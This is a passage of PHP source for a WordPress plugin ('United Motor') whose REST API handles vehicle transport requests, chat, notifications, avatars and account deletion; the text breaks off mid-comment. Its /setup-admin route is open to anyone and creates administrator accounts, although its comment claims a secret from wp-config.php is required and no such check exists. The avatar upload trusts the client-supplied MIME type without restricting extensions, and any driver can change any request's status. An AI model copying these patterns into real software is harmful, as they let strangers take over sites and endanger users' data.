<?php

/**
 * The API functionality of the plugin.
 *
 * @link       https://honduespacios.es
 * @since      1.0.0
 *
 * @package    United_Motor
 * @subpackage United_Motor/api
 */

/**
 * The API functionality of the plugin.
 *
 * Defines the plugin name, version, and the hooks for the REST API.
 *
 * @package    United_Motor
 * @subpackage United_Motor/api
 * @author     ludwins robles <ludwins36@gmail.com>
 */
class United_Motor_Api
{

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Activa filtros temporales de subida para conductores vía API.
	 *
	 * @var bool
	 */
	private $allowing_driver_upload = false;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of this plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct($plugin_name, $version)
	{

		$this->plugin_name = $plugin_name;
		$this->version = $version;

		// Fix: Asegurar que el header Authorization esté disponible para JWT Auth
		add_filter( 'determine_current_user', array( $this, 'fix_jwt_auth_header' ), 5 );
	}

	/**
	 * Intenta recuperar el header Authorization si el servidor lo ha eliminado (común en Apache/CGI).
	 *
	 * @param int|bool $user_id The current user ID or false.
	 * @return int|bool
	 */
	public function fix_jwt_auth_header( $user_id ) {
		if ( ! empty( $user_id ) ) {
			return $user_id;
		}

		if ( ! isset( $_SERVER['HTTP_AUTHORIZATION'] ) ) {
			if ( isset( $_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ) ) {
				$_SERVER['HTTP_AUTHORIZATION'] = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
			} else {
				$header = null;
				if ( function_exists( 'apache_request_headers' ) ) {
					$headers = apache_request_headers();
					if ( isset( $headers['Authorization'] ) ) {
						$header = $headers['Authorization'];
					} elseif ( isset( $headers['authorization'] ) ) {
						$header = $headers['authorization'];
					}
				}
				
				if ( $header ) {
					$_SERVER['HTTP_AUTHORIZATION'] = $header;
				}
			}
		}

		return $user_id;
	}

	/**
	 * Register the routes for the REST API.
	 *
	 * @since    1.0.0
	 */
	public function register_routes()
	{

		register_rest_route(
			'united-motor/v1',
			'/setup-admin',
			array(
				array(
					'methods'             => 'POST',
					'callback'            => array($this, 'create_admin_via_setup'),
					'permission_callback' => '__return_true',
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/password-reset',
			array(
				array(
					'methods'             => 'POST',
					'callback'            => array($this, 'request_password_reset'),
					'permission_callback' => '__return_true',
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/solicitudes',
			array(
				array(
					'methods'             => 'POST',
					'callback'            => array($this, 'create_solicitud'),
					'permission_callback' => array($this, 'permissions_check'),
				),
				array(
					'methods'             => 'GET',
					'callback'            => array($this, 'get_solicitudes'),
					'permission_callback' => array($this, 'permissions_check'),
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/solicitudes/(?P<id>\d+)',
			array(
				'methods'             => 'DELETE',
				'callback'            => array($this, 'delete_solicitud'),
				'permission_callback' => array($this, 'permissions_check'),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/solicitudes/(?P<id>\d+)/status',
			array(
				array(
					'methods'             => 'POST',
					'callback'            => array($this, 'update_solicitud_status'),
					'permission_callback' => array($this, 'solicitud_status_permissions_check'),
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/solicitudes/(?P<id>\d+)/status-history',
			array(
				array(
					'methods'             => 'GET',
					'callback'            => array($this, 'get_solicitud_status_history'),
					'permission_callback' => array($this, 'solicitud_status_history_permissions_check'),
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/solicitudes/(?P<id>\d+)/chat',
			array(
				array(
					'methods'             => 'GET',
					'callback'            => array($this, 'get_chat_messages'),
					'permission_callback' => array($this, 'chat_permissions_check'),
				),
				array(
					'methods'             => 'POST',
					'callback'            => array($this, 'send_chat_message'),
					'permission_callback' => array($this, 'chat_permissions_check'),
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/users/me',
			array(
				array(
					'methods'             => 'DELETE',
					'callback'            => array($this, 'delete_current_user_account'),
					'permission_callback' => array($this, 'permissions_check'),
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/users/me/avatar',
			array(
				array(
					'methods'             => 'POST',
					'callback'            => array($this, 'upload_user_avatar'),
					'permission_callback' => array($this, 'permissions_check'),
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/notifications',
			array(
				array(
					'methods'             => 'GET',
					'callback'            => array($this, 'get_notifications'),
					'permission_callback' => array($this, 'permissions_check'),
				),
			)
		);

		register_rest_route(
			'united-motor/v1',
			'/notifications/(?P<id>\d+)/read',
			array(
				array(
					'methods'             => 'POST',
					'callback'            => array($this, 'mark_notification_read'),
					'permission_callback' => array($this, 'permissions_check'),
				),
			)
		);
	}

	/**
	 * Solicita el envío del correo de restablecimiento de contraseña (WordPress / WooCommerce).
	 *
	 * URL: POST /wp-json/united-motor/v1/password-reset
	 * Cuerpo (JSON): { "email": "usuario@ejemplo.com" }
	 *
	 * @param WP_REST_Request $request Request.
	 * @return WP_REST_Response|WP_Error
	 */
	public function request_password_reset($request)
	{
		$params = $request->get_json_params();
		if (! is_array($params) || empty($params)) {
			$params = $request->get_params();
		}

		$email = isset($params['email']) ? sanitize_email((string) $params['email']) : '';

		if ($email === '' || ! is_email($email)) {
			return new WP_Error(
				'rest_invalid_param',
				__('Indica un correo electrónico válido.', 'united-motor'),
				array('status' => 400)
			);
		}

		$user = get_user_by('email', $email);
		if (! $user) {
			return new WP_Error(
				'rest_user_not_found',
				__('No existe ninguna cuenta registrada con ese correo.', 'united-motor'),
				array('status' => 404)
			);
		}

		$result = retrieve_password($user->user_login);
		if (is_wp_error($result)) {
			return new WP_Error(
				'rest_password_reset_failed',
				$result->get_error_message(),
				array('status' => 500)
			);
		}

		return new WP_REST_Response(
			array(
				'success' => true,
				'message' => __('Se ha enviado un correo con el enlace para restablecer tu contraseña.', 'united-motor'),
			),
			200
		);
	}

	/**
	 * Crea un usuario administrador (POST JSON o form). Requiere el mismo secreto que en wp-config.php.
	 *
	 * URL: POST /wp-json/united-motor/v1/setup-admin
	 * Cuerpo (JSON): { "secret": "...", "username": "...", "email": "...", "password": "..." }
	 *
	 * @param WP_REST_Request $request Request.
	 * @return WP_REST_Response|WP_Error
	 */
	public function create_admin_via_setup($request)
	{
		$params = $request->get_json_params();
		if (! is_array($params) || empty($params)) {
			$params = $request->get_params();
		}

		$username = isset($params['username']) ? sanitize_user((string) $params['username'], true) : '';
		$email    = isset($params['email']) ? sanitize_email((string) $params['email']) : '';
		$password = isset($params['password']) ? (string) $params['password'] : '';

		if ($username === '' || $email === '' || ! is_email($email)) {
			return new WP_Error('rest_invalid_param', __('Usuario y correo válidos son obligatorios.', 'united-motor'), array('status' => 400));
		}

		

		if (username_exists($username)) {
			return new WP_Error('rest_user_exists', __('Ese nombre de usuario ya existe.', 'united-motor'), array('status' => 409));
		}

		if (email_exists($email)) {
			return new WP_Error('rest_user_exists', __('Ese correo ya está registrado.', 'united-motor'), array('status' => 409));
		}

		$user_id = wp_insert_user(
			array(
				'user_login' => $username,
				'user_pass'  => $password,
				'user_email' => $email,
				'role'       => 'administrator',
			)
		);

		if (is_wp_error($user_id)) {
			return $user_id;
		}

		return new WP_REST_Response(
			array(
				'success'  => true,
				'message'  => __('Usuario administrador creado correctamente.', 'united-motor'),
				'user_id'  => (int) $user_id,
				'username' => $username,
			),
			201
		);
	}

	/**
	 * Check if the user is logged in.
	 *
	 * @param WP_REST_Request $request The request object.
	 * @return bool|WP_Error True if logged in, WP_Error otherwise.
	 */
	public function permissions_check($request)
	{
		// JWT Auth plugin handles authentication before this, but we double check
		if (! is_user_logged_in()) {
			return new WP_Error('rest_forbidden', __('Debes iniciar sesión para acceder a este recurso.', 'united-motor'), array('status' => 401));
		}
		return true;
	}

	/**
	 * Create a new Transport Request.
	 *
	 * @param WP_REST_Request $request The request object.
	 * @return WP_REST_Response|WP_Error The response object.
	 */
	public function create_solicitud($request)
	{
		$user_id = get_current_user_id();
		$params  = $request->get_params();

		// Log para depuración con WooCommerce
		if (function_exists('wc_get_logger')) {
			$logger  = wc_get_logger();
			$context = array('source' => 'api-motor');

			$logger->info('--- United Motor API: create_solicitud ---', $context);
			$logger->info('User ID: ' . $user_id, $context);
			$logger->info('Params: ' . print_r($params, true), $context);
			$logger->info('FILES (Global): ' . print_r($_FILES, true), $context);
			$logger->info('FILES (Request): ' . print_r($request->get_file_params(), true), $context);
		} else {
			// Fallback a error_log si WooCommerce no está activo
			error_log('--- United Motor API: create_solicitud ---');
			error_log('User ID: ' . $user_id);
			error_log('Params: ' . print_r($params, true));
			error_log('FILES (Global): ' . print_r($_FILES, true));
			error_log('FILES (Request): ' . print_r($request->get_file_params(), true));
		}

		// Campos requeridos y opcionales
		$comprador      = isset($params['comprador']) ? sanitize_text_field($params['comprador']) : '';
		$estado_subasta = isset($params['estadoSubasta']) ? sanitize_text_field($params['estadoSubasta']) : '';
		$pais           = isset($params['pais']) ? sanitize_text_field($params['pais']) : '';
		$subasta        = isset($params['subasta']) ? sanitize_text_field($params['subasta']) : '';
		$vin            = isset($params['vin']) ? sanitize_text_field($params['vin']) : '';

		// Usar el VIN como título si está disponible
		$title   = ! empty($vin) ? 'Solicitud VIN: ' . $vin : 'Nueva Solicitud - ' . date('Y-m-d H:i:s');

		// Construir contenido descriptivo
		$content = "Comprador: $comprador\n";
		$content .= "VIN: $vin\n";
		$content .= "País: $pais\n";
		$content .= "Subasta: $subasta ($estado_subasta)\n";

		$post_data = array(
			'post_title'   => $title,
			'post_content' => $content,
			'post_status'  => 'pendiente',
			'post_type'    => 'solicitud_transporte',
			'post_author'  => $user_id,
		);

		$post_id = wp_insert_post($post_data);

		if (is_wp_error($post_id)) {
			return $post_id;
		}

		// Guardar metadatos (Campos Personalizados)
		update_post_meta($post_id, 'comprador', $comprador);
		update_post_meta($post_id, 'estado_subasta', $estado_subasta);
		update_post_meta($post_id, 'pais', $pais);
		update_post_meta($post_id, 'subasta', $subasta);
		update_post_meta($post_id, 'vin', $vin);

		// Manejo de Archivos (Factura y Foto)
		require_once(ABSPATH . 'wp-admin/includes/image.php');
		require_once(ABSPATH . 'wp-admin/includes/file.php');
		require_once(ABSPATH . 'wp-admin/includes/media.php');

		// Procesar Factura (PDF) - Campo 'factura' en el FormData
		if (! empty($_FILES['factura'])) {
			$factura_id = media_handle_upload('factura', $post_id);
			if (! is_wp_error($factura_id)) {
				update_post_meta($post_id, 'factura_pdf_id', $factura_id);
				update_post_meta($post_id, 'factura_pdf_url', wp_get_attachment_url($factura_id));
			} else {
				// Opcional: registrar error o manejarlo
			}
		}

		// Procesar Foto (Imagen) - Campo 'foto' en el FormData
		if (! empty($_FILES['foto'])) {
			$foto_id = media_handle_upload('foto', $post_id);
			if (! is_wp_error($foto_id)) {
				update_post_meta($post_id, 'foto_vehiculo_id', $foto_id);
				update_post_meta($post_id, 'foto_vehiculo_url', wp_get_attachment_url($foto_id));
				// Establecer como imagen destacada
				set_post_thumbnail($post_id, $foto_id);
			}
		}

		// Notificar a gerencia por correo (después de guardar adjuntos)
		if (class_exists('United_Motor_Mail')) {
			$mail_sent = United_Motor_Mail::send_new_solicitud_to_management($post_id, $user_id);
			if (! $mail_sent && function_exists('wc_get_logger')) {
				wc_get_logger()->warning(
					'No se pudo enviar el correo de nueva solicitud a gerencia. Post ID: ' . $post_id,
					array('source' => 'api-motor')
				);
			}
		}

		return new WP_REST_Response(
			array(
				'success' => true,
				'id'      => $post_id,
				'message' => __('Solicitud creada correctamente.', 'united-motor'),
			),
			201
		);
	}

	/**
	 * Get all Transport Requests for the current user.
	 *
	 * @param WP_REST_Request $request The request object.
	 * @return WP_REST_Response|WP_Error The response object.
	 */
	public function get_solicitudes($request)
	{
		$user_id = get_current_user_id();
		$user    = wp_get_current_user();

		$is_driver = in_array('driver', (array) $user->roles);

		$args = array(
			'post_type'      => 'solicitud_transporte',
			'posts_per_page' => -1,
		);

		if ($is_driver) {
			// Si es conductor, buscar por meta valor asignado
			$args['meta_key']   = '_assigned_driver_id';
			$args['meta_value'] = $user_id;
		} else {
			// Si es usuario normal (cliente), buscar por autor (tus propias solicitudes)
			$args['author'] = $user_id;
		}

		$query = new WP_Query($args);
		$posts = array();

		if ($query->have_posts()) {
			while ($query->have_posts()) {
				$query->the_post();
				$post_id = get_the_ID();
				$posts[] = array(
					'id'            => $post_id,
					'title'         => get_the_title(),
					'content'       => get_the_content(),
					'status'        => get_post_status(),
					'date'          => get_the_date('Y-m-d H:i:s'),
					'comprador'     => get_post_meta($post_id, 'comprador', true),
					'estadoSubasta' => get_post_meta($post_id, 'estado_subasta', true),
					'pais'          => get_post_meta($post_id, 'pais', true),
					'subasta'       => get_post_meta($post_id, 'subasta', true),
					'vin'           => get_post_meta($post_id, 'vin', true),
					'factura_url'   => get_post_meta($post_id, 'factura_pdf_url', true),
					'foto_url'      => get_post_meta($post_id, 'foto_vehiculo_url', true),
					'price'         => get_post_meta($post_id, 'price', true),
				);
			}
			wp_reset_postdata();
		}

		return new WP_REST_Response($posts, 200);
	}

	/**
	 * Estados permitidos para una solicitud de transporte.
	 *
	 * @return array
	 */
	private function get_allowed_solicitud_statuses()
	{
		return array(
			'publish',
			'pending',
			'cotizando',
			'aprobada',
			'en_camino_recoger',
			'vehiculo_recogido',
			'en_transito',
			'en_transito_puerto',
			'entregado_puerto',
			'entregada',
			'cancelada',
		);
	}

	/**
	 * Etiquetas legibles de los estados de solicitud.
	 *
	 * @return array
	 */
	private function get_solicitud_status_labels()
	{
		return array(
			'publish'            => __('Publicado', 'united-motor'),
			'pending'            => __('Pendiente revisión', 'united-motor'),
			'pendiente'          => __('Pendiente', 'united-motor'),
			'cotizando'          => __('Cotizando', 'united-motor'),
			'aprobada'           => __('Aprobada', 'united-motor'),
			'en_camino_recoger'  => __('En camino a recoger', 'united-motor'),
			'vehiculo_recogido'  => __('Vehículo recogido', 'united-motor'),
			'en_transito'        => __('En Tránsito', 'united-motor'),
			'en_transito_puerto' => __('En tránsito al puerto', 'united-motor'),
			'entregado_puerto'   => __('Entregado en puerto', 'united-motor'),
			'entregada'          => __('Entregada', 'united-motor'),
			'cancelada'          => __('Cancelada', 'united-motor'),
		);
	}

	/**
	 * Permisos para cambiar el estado: administrador o conductor.
	 *
	 * @param WP_REST_Request $request Request.
	 * @return bool|WP_Error
	 */
	public function solicitud_status_permissions_check($request)
	{
		$user_id = get_current_user_id();
		if (! $user_id) {
			return new WP_Error('rest_forbidden', __('Debes iniciar sesión.', 'united-motor'), array('status' => 401));
		}

		$post_id = (int) $request['id'];
		$post    = get_post($post_id);

		if (! $post || $post->post_type !== 'solicitud_transporte') {
			return new WP_Error('rest_not_found', __('Solicitud no encontrada.', 'united-motor'), array('status' => 404));
		}

		$user      = wp_get_current_user();
		$roles     = (array) $user->roles;
		$is_admin  = current_user_can('manage_options') || in_array('administrator', $roles, true);
		$is_driver = in_array('driver', $roles, true);

		if ($is_admin || $is_driver) {
			return true;
		}

		return new WP_Error(
			'rest_forbidden',
			__('No tienes permiso para cambiar el estado de la solicitud.', 'united-motor'),
			array('status' => 403)
		);
	}

	/**
	 * Actualiza el estado de una solicitud con evidencia fotográfica.
	 *
	 * URL: POST /wp-json/united-motor/v1/solicitudes/{id}/status
	 * Content-Type: multipart/form-data
	 * Campos: status (string, requerido), foto (imagen, requerido)
	 *
	 * @param WP_REST_Request $request Request.
	 * @return WP_REST_Response|WP_Error
	 */
	public function update_solicitud_status($request)
	{
		$post_id = (int) $request['id'];
		$params  = $request->get_params();
		$user_id = get_current_user_id();

		$new_status = isset($params['status']) ? sanitize_key((string) $params['status']) : '';

		if ($new_status === '') {
			return new WP_Error(
				'rest_missing_param',
				__('Debes indicar el campo "status".', 'united-motor'),
				array('status' => 400)
			);
		}

		if (empty($_FILES['foto'])) {
			return new WP_Error(
				'rest_missing_param',
				__('Debes adjuntar la foto de evidencia en el campo "foto".', 'united-motor'),
				array('status' => 400)
			);
		}

		if (! in_array($new_status, $this->get_allowed_solicitud_statuses(), true)) {
			return new WP_Error(
				'rest_invalid_param',
				__('Estado no válido.', 'united-motor'),
				array(
					'status'  => 400,
					'allowed' => $this->get_allowed_solicitud_statuses(),
				)
			);
		}

		$post = get_post($post_id);
		if (! $post || $post->post_type !== 'solicitud_transporte') {
			return new WP_Error('rest_not_found', __('Solicitud no encontrada.', 'united-motor'), array('status' => 404));
		}

		require_once ABSPATH . 'wp-admin/includes/image.php';
		require_once ABSPATH . 'wp-admin/includes/file.php';
		require_once ABSPATH . 'wp-admin/includes/media.php';

		$this->enable_driver_upload_filters($post_id);

		$foto_id = $this->upload_status_evidence_image($post_id, 'foto');

		$this->disable_driver_upload_filters();

		if (is_wp_error($foto_id)) {
			return $foto_id;
		}

		$image_url = wp_get_attachment_url($foto_id);
		if (! $image_url) {
			return new WP_Error(
				'rest_upload_error',
				__('No se pudo obtener la URL de la imagen subida.', 'united-motor'),
				array('status' => 500)
			);
		}

		$previous_status = $post->post_status;

		if ($previous_status !== $new_status) {
			$updated = wp_update_post(
				array(
					'ID'          => $post_id,
					'post_status' => $new_status,
				),
				true
			);

			if (is_wp_error($updated)) {
				return $updated;
			}
		}

		update_post_meta($post_id, 'foto_evidencia_status_id', $foto_id);
		update_post_meta($post_id, 'foto_evidencia_status_url', $image_url);
		update_post_meta($post_id, 'foto_vehiculo_id', $foto_id);
		update_post_meta($post_id, 'foto_vehiculo_url', $image_url);
		set_post_thumbnail($post_id, $foto_id);

		$history_id = United_Motor_Status_History::add(
			$post_id,
			$user_id,
			$new_status,
			$foto_id,
			$image_url
		);

		if (! $history_id) {
			return new WP_Error(
				'rest_history_error',
				__('No se pudo guardar el historial de evidencia.', 'united-motor'),
				array('status' => 500)
			);
		}

		$labels       = $this->get_solicitud_status_labels();
		$status_label = isset($labels[ $new_status ]) ? $labels[ $new_status ] : $new_status;

		if ($previous_status !== $new_status) {
			$message = sprintf(
				__('El estado de tu solicitud "%s" ha cambiado a "%s".', 'united-motor'),
				$post->post_title,
				$status_label
			);

			if (class_exists('United_Motor_Notifications')) {
				United_Motor_Notifications::add($post->post_author, $message, 'info', (string) $post_id);
			}
		}

		return new WP_REST_Response(
			array(
				'success'         => true,
				'id'              => $post_id,
				'history_id'      => $history_id,
				'status'          => $new_status,
				'status_label'    => $status_label,
				'image_url'       => $image_url,
				'previous_status' => $previous_status,
				'message'         => __('Estado actualizado correctamente.', 'united-motor'),
			),
			200
		);
	}

	/**
	 * Permisos para consultar el historial de estados de una solicitud.
	 *
	 * @param WP_REST_Request $request Request.
	 * @return bool|WP_Error
	 */
	public function solicitud_status_history_permissions_check($request)
	{
		$user_id = get_current_user_id();
		if (! $user_id) {
			return new WP_Error('rest_forbidden', __('Debes iniciar sesión.', 'united-motor'), array('status' => 401));
		}

		$post_id = (int) $request['id'];
		$post    = get_post($post_id);

		if (! $post || $post->post_type !== 'solicitud_transporte') {
			return new WP_Error('rest_not_found', __('Solicitud no encontrada.', 'united-motor'), array('status' => 404));
		}

		$user      = wp_get_current_user();
		$roles     = (array) $user->roles;
		$is_admin  = current_user_can('manage_options') || in_array('administrator', $roles, true);
		$is_driver = in_array('driver', $roles, true);

		if ($is_admin) {
			return true;
		}

		if ((int) $post->post_author === $user_id) {
			return true;
		}

		if ($is_driver) {
			$driver_id = get_post_meta($post_id, '_assigned_driver_id', true);
			if ((int) $driver_id === $user_id) {
				return true;
			}
		}

		return new WP_Error(
			'rest_forbidden',
			__('No tienes permiso para ver el historial de esta solicitud.', 'united-motor'),
			array('status' => 403)
		);
	}

	/**
	 * Devuelve el historial de evidencias por cambio de estado.
	 *
	 * URL: GET /wp-json/united-motor/v1/solicitudes/{id}/status-history
	 *
	 * @param WP_REST_Request $request Request.
	 * @return WP_REST_Response|WP_Error
	 */
	public function get_solicitud_status_history($request)
	{
		$post_id = (int) $request['id'];
		$post    = get_post($post_id);

		if (! $post || $post->post_type !== 'solicitud_transporte') {
			return new WP_Error('rest_not_found', __('Solicitud no encontrada.', 'united-motor'), array('status' => 404));
		}

		$history = United_Motor_Status_History::get_by_post_id($post_id);

		return new WP_REST_Response($history, 200);
	}

	/**
	 * Delete a Transport Request.
	 *
	 * @param WP_REST_Request $request The request object.
	 * @return WP_REST_Response|WP_Error The response object.
	 */
	public function delete_solicitud($request)
	{
		$post_id = $request['id'];
		$user_id = get_current_user_id();

		$post = get_post($post_id);

		if (! $post || $post->post_type !== 'solicitud_transporte') {
			return new WP_Error('rest_post_invalid', __('Solicitud no encontrada.', 'united-motor'), array('status' => 404));
		}

		if ((int) $post->post_author !== $user_id && ! current_user_can('delete_others_posts')) {
			return new WP_Error('rest_forbidden', __('No tienes permiso para borrar esta solicitud.', 'united-motor'), array('status' => 403));
		}

		$result = wp_delete_post($post_id, true);

		if (! $result) {
			return new WP_Error('rest_cannot_delete', __('La solicitud no se pudo borrar.', 'united-motor'), array('status' => 500));
		}

		return new WP_REST_Response(
			array(
				'success' => true,
				'id'      => $post_id,
				'message' => __('Solicitud borrada correctamente.', 'united-motor'),
			),
			200
		);
	}

	/**
	 * Permissions check for Chat.
	 * Only author and assigned driver (and admins) can access.
	 */
	public function chat_permissions_check($request)
	{
		$user_id = get_current_user_id();
		if (! $user_id) {
			return new WP_Error('rest_forbidden', __('Debes iniciar sesión.', 'united-motor'), array('status' => 401));
		}

		$post_id = $request['id'];
		$post    = get_post($post_id);

		if (! $post || $post->post_type !== 'solicitud_transporte') {
			return new WP_Error('rest_not_found', __('Solicitud no encontrada.', 'united-motor'), array('status' => 404));
		}

		// Allow admins
		if (current_user_can('manage_options')) {
			return true;
		}

		// Allow Post Author (Client)
		if ((int) $post->post_author === $user_id) {
			return true;
		}

		// Allow Assigned Driver
		$driver_id = get_post_meta($post_id, '_assigned_driver_id', true);
		if ((int) $driver_id === $user_id) {
			return true;
		}

		return new WP_Error('rest_forbidden', __('No tienes permiso para acceder al chat de esta solicitud.', 'united-motor'), array('status' => 403));
	}

	/**
	 * Get Chat Messages.
	 */
	public function get_chat_messages($request)
	{
		global $wpdb;
		$post_id    = $request['id'];
		$table_name = $wpdb->prefix . 'united_motor_messages';

		$sql = $wpdb->prepare(
			"SELECT m.*, u.display_name as author_name 
			 FROM $table_name m
			 LEFT JOIN {$wpdb->users} u ON m.author_id = u.ID
			 WHERE m.post_id = %d
			 ORDER BY m.created_at ASC",
			$post_id
		);

		$results  = $wpdb->get_results($sql);
		$messages = array();

		foreach ($results as $row) {
			$messages[] = array(
				'id'          => $row->id,
				'parent'      => $row->parent_id,
				'content'     => $row->message,
				'author_id'   => $row->author_id,
				'author_name' => $row->author_name ? $row->author_name : 'Usuario Eliminado',
				'user_id' 	  => $row->author_id,
				'date'        => $row->created_at,
				'is_read'     => (bool) $row->is_read,
			);
		}

		return new WP_REST_Response($messages, 200);
	}

	/**
	 * Send Chat Message.
	 */
	public function send_chat_message($request)
	{
		global $wpdb;
		$post_id = $request['id'];
		$user_id = get_current_user_id();
		$user    = get_userdata($user_id);
		$params  = $request->get_params();
		$message = isset($params['message']) ? sanitize_textarea_field($params['message']) : '';
		
		// Determine parent_id and author_id based on role
		$is_driver = in_array('driver', (array) $user->roles);
		$assigned_driver_id = get_post_meta($post_id, '_assigned_driver_id', true);

		if ($is_driver) {
			// Si es conductor: Parent = User ID, Author = Assigned Driver ID
			$parent    = $user_id;
			$author_id = $assigned_driver_id ? $assigned_driver_id : $user_id;
		} else {
			// "Lo opuesto" (Usuario normal / Cliente): Parent = Assigned Driver ID, Author = User ID
			$parent    = $assigned_driver_id ? $assigned_driver_id : 0;
			$author_id = $user_id;
		}

		if (empty($message)) {
			return new WP_Error('rest_invalid_param', __('El mensaje no puede estar vacío.', 'united-motor'), array('status' => 400));
		}

		$table_name = $wpdb->prefix . 'united_motor_messages';

		$data = array(
			'post_id'    => $post_id,
			'author_id'  => $author_id,
			'parent_id'  => $parent,
			'message'    => $message,
			'is_read'    => 0,
			'created_at' => current_time('mysql'),
		);

		$format = array('%d', '%d', '%d', '%s', '%d', '%s');

		$result = $wpdb->insert($table_name, $data, $format);

		if (! $result) {
			return new WP_Error('rest_error', __('Error al guardar el mensaje.', 'united-motor'), array('status' => 500));
		}



		$message_id = $wpdb->insert_id;

		// Crear notificación para el parent
		if ( ! empty( $parent ) && class_exists( 'United_Motor_Notifications' ) ) {
			$post_title = get_the_title( $post_id );
			$noti_msg   = sprintf( 'Has recibido un nuevo mensaje de su solicitud "%s"', $post_title );
			United_Motor_Notifications::add( $parent, $noti_msg, 'link', (string) $post_id );
		}

		return new WP_REST_Response(array(
			'success' => true,
			'message' => 'Mensaje enviado.',
			'data'    => array(
				'id'          => $message_id,
				'parent'      => $parent,
				'content'     => $message,
				'author_id'   => $user_id,
				'author_name' => $user->display_name,
				'date'        => $data['created_at'],
			)
		), 201);
	}

	/**
	 * Upload User Avatar.
	 * 
	 * @param WP_REST_Request $request The request object.
	 * @return WP_REST_Response|WP_Error The response object.
	 */
	public function upload_user_avatar($request)
	{
		$user_id = get_current_user_id();

		if (empty($_FILES['file'])) {
			return new WP_Error('rest_upload_no_file', __('No se ha subido ningún archivo.', 'united-motor'), array('status' => 400));
		}

		$file = $_FILES['file'];

		// Validación básica de tipo de archivo
		$allowed_types = array('image/jpeg', 'image/png', 'image/gif');
		if (! in_array($file['type'], $allowed_types)) {
			return new WP_Error('rest_upload_invalid_type', __('Solo se permiten imágenes (JPG, PNG, GIF).', 'united-motor'), array('status' => 400));
		}

		// Definir directorio personalizado
		$upload_dir = wp_upload_dir();
		$custom_dir = $upload_dir['basedir'] . '/united-motor-avatars';
		$custom_url = $upload_dir['baseurl'] . '/united-motor-avatars';

		// Crear directorio si no existe
		if (! file_exists($custom_dir)) {
			wp_mkdir_p($custom_dir);
		}

		// Sanitizar nombre de archivo y hacerlo único
		$filename = sanitize_file_name($file['name']);
		$filename = wp_unique_filename($custom_dir, $filename);
		$destination = $custom_dir . '/' . $filename;

		// Mover el archivo
		if (move_uploaded_file($file['tmp_name'], $destination)) {
			$avatar_url = $custom_url . '/' . $filename;

			// Guardar URL en meta
			update_user_meta($user_id, 'united_motor_avatar_url', $avatar_url);

			// Opcional: Guardar path local si se necesita borrar después
			update_user_meta($user_id, 'united_motor_avatar_path', $destination);

			return new WP_REST_Response(array(
				'success' => true,
				'message' => __('Avatar actualizado correctamente.', 'united-motor'),
				'data'    => array(
					'avatar_url' => $avatar_url,
				),
			), 200);
		} else {
			return new WP_Error('rest_upload_error', __('Error al mover el archivo al directorio de destino.', 'united-motor'), array('status' => 500));
		}
	}

	/**
	 * Elimina la cuenta del usuario autenticado (JWT u otra sesión REST).
	 *
	 * @param WP_REST_Request $request The request object.
	 * @return WP_REST_Response|WP_Error
	 */
	public function delete_current_user_account($request)
	{
		$user_id = get_current_user_id();
		if (! $user_id) {
			return new WP_Error('rest_forbidden', __('No hay usuario autenticado.', 'united-motor'), array('status' => 401));
		}

		$user = get_userdata($user_id);
		if (! $user) {
			return new WP_Error('rest_not_found', __('Usuario no encontrado.', 'united-motor'), array('status' => 404));
		}

		// Evitar dejar el sitio sin ningún administrador
		$admin_ids = get_users(array(
			'capability' => 'manage_options',
			'fields'     => 'ID',
		));
		if (user_can($user_id, 'manage_options') && count($admin_ids) === 1 && (int) $admin_ids[0] === $user_id) {
			return new WP_Error(
				'rest_cannot_delete',
				__('No se puede eliminar el único administrador del sitio.', 'united-motor'),
				array('status' => 403)
			);
		}

		// Reasignar entradas a otro administrador si existe (evita borrar contenido huérfano)
		$reassign = null;
		$admins   = get_users(array(
			'role'   => 'administrator',
			'number' => 10,
			'fields' => 'ID',
		));
		foreach ($admins as $admin_id) {
			if ((int) $admin_id !== $user_id) {
				$reassign = (int) $admin_id;
				break;
			}
		}

		require_once ABSPATH . 'wp-admin/includes/user.php';

		$elevate_delete = function ($allcaps, $caps, $args, $user) use ($user_id) {
			if ((int) $user->ID === $user_id && in_array('delete_users', (array) $caps, true)) {
				$allcaps['delete_users'] = true;
			}
			return $allcaps;
		};
		add_filter('user_has_cap', $elevate_delete, 10, 4);

		if ($reassign) {
			wp_delete_user($user_id, $reassign);
		} else {
			wp_delete_user($user_id);
		}

		remove_filter('user_has_cap', $elevate_delete, 10);

		return new WP_REST_Response(
			array(
				'success' => true,
				'message' => __('Tu cuenta ha sido eliminada correctamente.', 'united-motor'),
			),
			200
		);
	}

	/**
	 * Add Avatar URL to JWT Token Response.
	 * 
	 * @param array $data The response data.
	 * @param WP_User $user The user object.
	 * @return array The modified response data.
	 */
	public function add_avatar_to_token_response($data, $user)
	{
		$user_id = $user->ID;
		$avatar_url = get_user_meta( $user_id, 'united_motor_avatar_url', true );

		// Fallback to Gravatar if no custom avatar
		if ( empty( $avatar_url ) ) {
			$avatar_url = get_avatar_url( $user_id );
		}

		$data['avatar_url'] = $avatar_url;
		// Add other useful data if needed (name, roles, etc. are usually present but we can ensure)
		$data['user_display_name'] = $user->display_name;

		return $data;
	}

	/**
	 * Get active notifications for the current user.
	 *
	 * @param WP_REST_Request $request The request object.
	 * @return WP_REST_Response|WP_Error The response object.
	 */
	public function get_notifications($request) {
		global $wpdb;
		$user_id = get_current_user_id();

		$table_name = $wpdb->prefix . 'united_motor_notifications';

		// Get active notifications (status = 1)
		$results = $wpdb->get_results(
			$wpdb->prepare(
				"SELECT * FROM $table_name WHERE user_id = %d AND status = 1 ORDER BY created_at DESC",
				$user_id
			)
		);

		return new WP_REST_Response($results, 200);
	}

	/**
